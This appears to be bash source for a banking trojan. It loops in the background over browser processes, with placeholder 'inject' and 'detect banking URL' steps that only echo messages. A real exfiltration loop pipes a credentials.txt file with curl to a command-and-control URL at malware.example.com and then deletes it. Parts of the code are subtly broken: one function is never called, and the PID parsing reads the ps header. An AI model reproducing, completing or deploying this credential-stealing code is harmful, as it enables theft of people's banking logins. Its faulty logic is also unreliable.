#!/bin/bash

# Banking Trojan Code

# Function: Install necessary packages
install_packages() {
    if [ $(which curl) ]; then
        echo "curl is already installed."
    else
        apt-get update && apt-get install -y curl
    fi
}

# Function: Download and execute the payload
download_payload() {
    # Inject code into browser process for monitoring web traffic

    # Hooking function to monitor active window title or process list
    hook_browser() {
        while true; do
            # Poll for active windows or processes
            active_window=$(xdotool getactivewindow)
            process_list=$(ps aux)

            # Check if the browser is in use
            if echo "$process_list" | grep -q "firefox"; then
                # Inject code into browser process to monitor web traffic
                inject_code_into_browser() {
                    firefox_pid=$(echo "$process_list" | awk '{print $2}' | head -n 1)
                    if [ -z "$firefox_pid" ]; then
                        echo "Firefox not found."
                    else
                        # Add your code here for monitoring web traffic (e.g., add a user.js file to the Firefox profile)
                        echo "Injecting code into Firefox process with PID $firefox_pid"
                    fi
                }
            elif echo "$process_list" | grep -q "chrome"; then
                chrome_pid=$(echo "$process_list" | awk '{print $2}' | head -n 1)
                if [ -z "$chrome_pid" ]; then
                    echo "Chrome not found."
                else
                    # Add your code here for monitoring web traffic (e.g., add a user.js file to the Chrome profile)
                    echo "Injecting code into Chrome process with PID $chrome_pid"
                fi
            elif echo "$process_list" | grep -q "opera"; then
                opera_pid=$(echo "$process_list" | awk '{print $2}' | head -n 1)
                if [ -z "$opera_pid" ]; then
                    echo "Opera not found."
                else
                    # Add your code here for monitoring web traffic (e.g., add a user.js file to the Opera profile)
                    echo "Injecting code into Opera process with PID $opera_pid"
                fi
            elif echo "$process_list" | grep -q "msedge"; then
                edge_pid=$(echo "$process_list" | awk '{print $2}' | head -n 1)
                if [ -z "$edge_pid" ]; then
                    echo "Microsoft Edge not found."
                else
                    # Add your code here for monitoring web traffic (e.g., add a user.js file to the Edge profile)
                    echo "Injecting code into Microsoft Edge process with PID $edge_pid"
                fi
            fi

            sleep 5  # Poll every 5 seconds
        done
    }

    hook_browser &

    # Function: Detect when the user visits a banking URL and record the POST data (usernames/passwords)
    detect_banking_url() {
        while true; do
            active_window=$(xdotool getactivewindow)
            process_list=$(ps aux)

            if echo "$process_list" | grep -q "firefox"; then
                firefox_pid=$(echo "$process_list" | awk '{print $2}' | head -n 1)
                if [ ! -z "$firefox_pid" ]; then
                    # Add your code here for detecting and recording banking URLs (e.g., check the URL in the browser's network activity)
                    echo "Detecting banking URLs in Firefox process with PID $firefox_pid"
                fi
            elif echo "$process_list" | grep -q "chrome"; then
                chrome_pid=$(echo "$process_list" | awk '{print $2}' | head -n 1)
                if [ ! -z "$chrome_pid" ]; then
                    # Add your code here for detecting and recording banking URLs (e.g., check the URL in the browser's network activity)
                    echo "Detecting banking URLs in Chrome process with PID $chrome_pid"
                fi
            elif echo "$process_list" | grep -q "opera"; then
                opera_pid=$(echo "$process_list" | awk '{print $2}' | head -n 1)
                if [ ! -z "$opera_pid" ]; then
                    # Add your code here for detecting and recording banking URLs (e.g., check the URL in the browser's network activity)
                    echo "Detecting banking URLs in Opera process with PID $opera_pid"
                fi
            elif echo "$process_list" | grep -q "msedge"; then
                edge_pid=$(echo "$process_list" | awk '{print $2}' | head -n 1)
                if [ ! -z "$edge_pid" ]; then
                    # Add your code here for detecting and recording banking URLs (e.g., check the URL in the browser's network activity)
                    echo "Detecting banking URLs in Microsoft Edge process with PID $edge_pid"
                fi
            fi

            sleep 5  # Poll every 5 seconds
        done
    }

    detect_banking_url &

    # Function: Send captured credentials to C2 server immediately
    exfiltrate_credentials() {
        while true; do
            if [ -f "credentials.txt" ]; then
                cat credentials.txt | curl -s https://malware.example.com/exfiltrate > /dev/null 2>&1
                rm credentials.txt
            fi

            sleep 60  # Exfiltrate every minute
        done
    }

    exfiltrate_credentials &
}

install_packages
download_payload
